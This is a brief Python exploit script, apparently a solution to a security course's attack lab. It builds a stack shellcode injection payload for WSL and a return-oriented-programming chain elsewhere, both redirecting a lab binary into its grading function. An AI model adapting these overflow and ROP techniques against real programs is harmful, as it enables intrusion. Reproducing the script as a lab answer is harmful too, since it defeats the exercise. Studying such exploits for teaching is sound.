#!/usr/bin/env python3
"""Build a stack-code payload for WSL and a ROP fallback elsewhere."""
import os
import platform
import struct
import sys

p64 = lambda value: struct.pack("<Q", value)

def stack_payload():
    # The WSL2 target's local expression buffer is 0x721000800fd0.
    # mov edi,4; push exit path; push grade_eval; ret
    shellcode = bytes.fromhex("bf0400000068b919400068871a4000c3")
    return shellcode + b"B" * 8 + p64(0x721000800FD0)

def rop_fallback():
    # Use code already mapped executable when the host stack is not WSL's RWX map.
    # grade_eval+1 skips push rbp to keep its printf call aligned.
    return (
        b"A" * 24
        + p64(0x401C93)          # pop rdi; ret
        + p64(4)
        + p64(0x401A88)[:7]      # grade_eval+1, completed by gets' NUL
        + b"\n"
    )

is_wsl = "microsoft" in platform.release().lower()
force_rop = os.environ.get("ATTACKLAB_FORCE_DARK_ROP") == "1"
payload = stack_payload() if is_wsl and not force_rop else rop_fallback()
sys.stdout.buffer.write(payload)

